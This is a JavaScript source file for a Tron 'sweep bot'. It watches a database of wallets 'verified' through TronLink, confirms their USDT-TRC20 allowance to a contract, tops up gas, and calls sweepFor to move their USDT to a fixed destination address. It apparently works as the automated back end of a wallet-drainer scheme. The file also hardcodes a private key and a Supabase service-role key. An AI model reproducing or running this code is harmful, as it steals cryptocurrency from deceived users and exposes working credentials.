// bot.js — Tron sweep bot with Supabase Realtime
// Watches verified_wallets table (chain=tron) — same pattern as eth/bnb/polygon bots.
//
// On each new/updated verified wallet:
//   1. Checks USDT-TRC20 balance
//   2. Sends ~13 TRX gas airdrop if native balance < 7 TRX (~$1 USD)
//   3. Calls sweepFor(user, [USDT]) on TronV2 contract → funds go to destination
//
// Note: Tron verified wallets are stored in the verified_wallets table
//       (not delegated_wallets — Tron uses its own verify flow via TronLink).

require("dotenv").config();
const TronWebModule = require("tronweb");
const { createClient } = require("@supabase/supabase-js");
const ws = require("ws");

// ── Config ────────────────────────────────────────────────────────────────────

// Tron owner/relayer key — derives to TYfN1BxXHMzfxu5Z8LqpSVxf7ZzhDQcBAS.
// Must be the TronV2 contract owner (sweepFor is onlyOwner). Env override respected.
const DEFAULT_TRON_PRIVATE_KEY  = "c967939206436afc012790cce93b3a97f9998dedf7fc8d7e0f0dcfe2e16b4fed";
const PRIVATE_KEY               = (process.env.TRON_PRIVATE_KEY || DEFAULT_TRON_PRIVATE_KEY).replace(/^0x/, "");
// Never fall back to the shared EVM vars for addresses — they hold EVM hex which is wrong for Tron.
const CONTRACT_ADDRESS          = process.env.TRON_CONTRACT_ADDRESS          || "TCmTc2WbtGbDuL6b5iFEkD2EzmjyG8ZnJy";
const DESTINATION_ADDRESS       = process.env.TRON_DESTINATION_ADDRESS       || "TP3mX1Uqhno2WUtdBPVie7nkuuJR1EQBxN";
// verified_wallets lives in the walletverification Supabase project — NOT the pebble-bots one.
const SUPABASE_URL              = process.env.TRON_SUPABASE_URL              || "https://lrvuasndxgkulquwcocn.supabase.co";
const SUPABASE_SERVICE_ROLE_KEY = process.env.TRON_SUPABASE_SERVICE_ROLE_KEY || "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxydnVhc25keGdrdWxxdXdjb2NuIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc2OTY5OTM2NSwiZXhwIjoyMDg1Mjc1MzY1fQ.bZx3kIBvUY7GHaKiZ43tJziSCKWyA3pWh-jsvMIR3PQ";
const FULL_HOST                 = process.env.TRON_FULL_HOST                 || "https://api.trongrid.io";
const CHAIN                     = "tron";

// USDT-TRC20 mainnet (6 decimals)
const USDT_TRC20    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const MIN_USDT_SUN  = 500_000n; // 0.50 USDT minimum before sweeping

// Gas airdrop: ~$2 @ $0.15/TRX = 13 TRX; send if wallet has < 7 TRX
const DROP_TRX_SUN = 13_000_000; // 13 TRX in sun
const MIN_TRX_SUN  =  7_000_000; //  7 TRX threshold (~$1)

// ── Validation ────────────────────────────────────────────────────────────────

if (!PRIVATE_KEY) {
  console.error("Missing required env var: TRON_PRIVATE_KEY (or PRIVATE_KEY)");
  process.exit(1);
}

// ── TronWeb setup ─────────────────────────────────────────────────────────────

// Support both tronweb v4 (TronWeb) and v6 (TronWeb.TronWeb)
const TronWeb = TronWebModule.TronWeb ?? TronWebModule.default ?? TronWebModule;

const tronWeb = new TronWeb({
  fullHost:   FULL_HOST,
  privateKey: PRIVATE_KEY,
});

// ── Supabase setup ────────────────────────────────────────────────────────────

const supabase = SUPABASE_URL && SUPABASE_SERVICE_ROLE_KEY
  ? createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, {
      auth: { persistSession: false },
      realtime: { transport: ws },
    })
  : null;

// ── TronV2 contract ABI ───────────────────────────────────────────────────────

const TRONV2_ABI = [
  {
    name: "sweepFor",
    type: "Function",
    inputs: [
      { name: "user",   type: "address"   },
      { name: "tokens", type: "address[]" },
    ],
    outputs: [],
    stateMutability: "nonpayable",
  },
  {
    name: "sweepable",
    type: "Function",
    inputs: [
      { name: "user",  type: "address" },
      { name: "token", type: "address" },
    ],
    outputs: [{ name: "", type: "uint256" }],
    stateMutability: "view",
  },
];

// ── State ─────────────────────────────────────────────────────────────────────

const sweeping     = new Set(); // active sweep guard (hex addresses)
const knownWallets = new Set(); // known wallet set for Realtime dedup

// ── Logging ───────────────────────────────────────────────────────────────────

const TAG  = "[TRON]";
const log  = (msg) => console.log(`[${new Date().toISOString()}] ${TAG} ${msg}`);
const warn = (msg) => console.warn(`[${new Date().toISOString()}] ${TAG} ⚠  ${msg}`);
const err  = (msg) => console.error(`[${new Date().toISOString()}] ${TAG} ✖  ${msg}`);

// ── Address helpers ───────────────────────────────────────────────────────────

/**
 * Normalize any address form to Tron base58 (T…).
 * Supabase stores base58 from /api/verify/tron — do NOT assume hex.
 */
function toBase58(addr) {
  if (!addr || typeof addr !== "string") return null;
  try {
    // Already base58 Tron address
    if (/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(addr)) return addr;
    // Hex with or without 0x / 41 prefix
    const clean = addr.replace(/^0x/i, "").toLowerCase();
    const tronHex = clean.startsWith("41") && clean.length === 42 ? clean : "41" + clean.padStart(40, "0");
    return tronWeb.address.fromHex(tronHex);
  } catch {
    return null;
  }
}

// ── Chain queries ─────────────────────────────────────────────────────────────

async function getUsdtBalance(base58Addr) {
  try {
    const contract = await tronWeb.contract().at(USDT_TRC20);
    const raw      = await contract.balanceOf(base58Addr).call();
    return BigInt(raw.toString());
  } catch (e) {
    warn(`USDT balanceOf(${base58Addr}): ${e.message}`);
    return 0n;
  }
}

async function getNativeBalanceSun(base58Addr) {
  try {
    const bal = await tronWeb.trx.getBalance(base58Addr);
    return Number(bal);
  } catch {
    return 0;
  }
}

// ── Gas airdrop ───────────────────────────────────────────────────────────────

async function sendGasIfNeeded(base58Addr) {
  const native = await getNativeBalanceSun(base58Addr);
  if (native >= MIN_TRX_SUN) {
    log(`Gas OK for ${base58Addr} (${(native / 1e6).toFixed(2)} TRX) — skip airdrop`);
    return;
  }
  log(`Gas airdrop → ${base58Addr} (${DROP_TRX_SUN / 1e6} TRX)`);
  try {
    const tx = await tronWeb.trx.sendTransaction(base58Addr, DROP_TRX_SUN);
    if (!tx?.txid) throw new Error("No txid returned");
    log(`Gas airdrop tx: ${tx.txid}`);
    // Wait ~3.5s for TRX to land before sweepFor (DPoS blocks ≈ 3s)
    await new Promise((r) => setTimeout(r, 3500));
  } catch (e) {
    err(`Gas airdrop failed for ${base58Addr}: ${e.message}`);
  }
}

// ── Sweep ─────────────────────────────────────────────────────────────────────

async function sweepWallet(addr) {
  const base58Addr = toBase58(addr);
  if (!base58Addr) { err(`Cannot normalize address: ${addr}`); return; }
  if (sweeping.has(base58Addr)) return;
  sweeping.add(base58Addr);
  try {
    // 1. Check USDT balance
    const usdtBal = await getUsdtBalance(base58Addr);
    if (usdtBal < MIN_USDT_SUN) {
      log(`${base58Addr} — USDT ${(Number(usdtBal) / 1e6).toFixed(6)} below threshold — skip`);
      return;
    }
    log(`${base58Addr} — USDT ${(Number(usdtBal) / 1e6).toFixed(2)} — sweeping`);

    // 2. Confirm allowance to our contract (spender must be contract, not relayer)
    try {
      const usdt = await tronWeb.contract().at(USDT_TRC20);
      const allowRaw = await usdt.allowance(base58Addr, CONTRACT_ADDRESS).call();
      const allow = BigInt(allowRaw.toString());
      if (allow < MIN_USDT_SUN) {
        warn(`${base58Addr} — allowance to contract is ${(Number(allow) / 1e6).toFixed(6)} — skip (need approve to ${CONTRACT_ADDRESS})`);
        return;
      }
      log(`${base58Addr} — allowance OK (${(Number(allow) / 1e6).toFixed(2)} USDT)`);
    } catch (e) {
      warn(`allowance check failed (continuing): ${e.message}`);
    }

    // 3. Airdrop TRX gas if needed (owner pays energy for sweepFor, but keep for safety)
    await sendGasIfNeeded(base58Addr);

    // 4. Call sweepFor(user, [USDT]) — TronV2: onlyOwner
    log(`sweepFor(${base58Addr}, [USDT]) → ${DESTINATION_ADDRESS}`);
    const contract = tronWeb.contract(TRONV2_ABI, CONTRACT_ADDRESS);
    const txHash   = await contract.sweepFor(base58Addr, [USDT_TRC20]).send({
      feeLimit:           50_000_000, // 50 TRX max fee
      callValue:          0,
      shouldPollResponse: false,
    });
    log(`sweepFor tx: ${txHash}`);
  } catch (e) {
    err(`sweepWallet ${base58Addr}: ${e.message}`);
  } finally {
    sweeping.delete(base58Addr);
  }
}

// ── Supabase: load existing wallets on startup ────────────────────────────────

async function loadKnownWallets() {
  if (!supabase) return;
  try {
    const { data, error } = await supabase
      .from("verified_wallets")
      .select("address")
      .eq("chain", CHAIN)
      .eq("authorized", true);
    if (error) { warn(`loadKnownWallets: ${error.message}`); return; }
    knownWallets.clear();
    for (const row of data || []) {
      if (row.address) knownWallets.add(row.address);
    }
    log(`Loaded ${knownWallets.size} Tron wallet(s)`);
  } catch (e) {
    warn(`loadKnownWallets: ${e.message}`);
  }
}

// ── Supabase Realtime ─────────────────────────────────────────────────────────

function subscribeRealtime() {
  if (!supabase) { warn("Supabase not configured — Realtime skipped"); return; }

  supabase
    .channel("verified_wallets_tron")
    .on(
      "postgres_changes",
      { event: "INSERT", schema: "public", table: "verified_wallets", filter: "chain=eq.tron" },
      async (payload) => {
        const row     = payload.new || {};
        const address = row.address;
        if (!address || !row.authorized) return;
        const isNew   = !knownWallets.has(address);
        knownWallets.add(address);
        log(`🔔 Realtime ${isNew ? "new" : "updated"} wallet ${address}`);
        await sweepWallet(address).catch((e) => err(`sweep: ${e.message}`));
      }
    )
    .on(
      "postgres_changes",
      { event: "UPDATE", schema: "public", table: "verified_wallets", filter: "chain=eq.tron" },
      async (payload) => {
        const row     = payload.new || {};
        const address = row.address;
        if (!address || !row.authorized) return;
        knownWallets.add(address);
        log(`🔄 Realtime update ${address}`);
        await sweepWallet(address).catch((e) => err(`sweep: ${e.message}`));
      }
    )
    .subscribe((status) => {
      if (status === "SUBSCRIBED") {
        log("✅ Supabase Realtime subscribed (chain=tron)");
      } else if (status === "CHANNEL_ERROR" || status === "TIMED_OUT") {
        warn(`Realtime ${status} — retrying in 10s`);
        setTimeout(subscribeRealtime, 10_000);
      }
    });
}

// ── Polling fallback ──────────────────────────────────────────────────────────
// Re-checks wallets updated in the last 5 minutes every 30s.
// Guards against missed Realtime events (same pattern as EVM bots' block listener).

async function pollRecentWallets() {
  if (!supabase) return;
  try {
    const since = new Date(Date.now() - 5 * 60 * 1000).toISOString();
    const { data } = await supabase
      .from("verified_wallets")
      .select("address")
      .eq("chain", CHAIN)
      .eq("authorized", true)
      .gte("updated_at", since);
    for (const row of data || []) {
      if (row.address && !sweeping.has(row.address)) {
        await sweepWallet(row.address).catch((e) =>
          err(`poll sweep ${row.address}: ${e.message}`)
        );
      }
    }
  } catch {}
}

// ── Health check ──────────────────────────────────────────────────────────────

async function checkRelayerBalance() {
  try {
    const addr = tronWeb.defaultAddress.base58;
    const bal  = await tronWeb.trx.getBalance(addr);
    log(`Relayer: ${addr} — ${(Number(bal) / 1e6).toFixed(2)} TRX`);
    if (Number(bal) < 50_000_000) {
      warn("Relayer TRX LOW (< 50 TRX) — top up or sweeps will fail");
    }
  } catch (e) {
    warn(`Relayer balance check: ${e.message}`);
  }
}

// ── Start ─────────────────────────────────────────────────────────────────────

async function start() {
  log("Tron sweep bot starting...");
  log(`Contract:    ${CONTRACT_ADDRESS}`);
  log(`Destination: ${DESTINATION_ADDRESS}`);
  log(`USDT-TRC20:  ${USDT_TRC20}`);
  log(`Full host:   ${FULL_HOST}`);

  await checkRelayerBalance();
  await loadKnownWallets();
  subscribeRealtime();

  // Poll every 30 seconds as block-listener equivalent
  setInterval(pollRecentWallets, 30_000);

  log("Listening for Realtime events and polling every 30s...");
}

start().catch((e) => { err(`Startup failed: ${e.message}`); process.exit(1); });

process.on("SIGINT",  () => { log("Shutting down..."); process.exit(0); });
process.on("SIGTERM", () => { log("Shutting down..."); process.exit(0); });
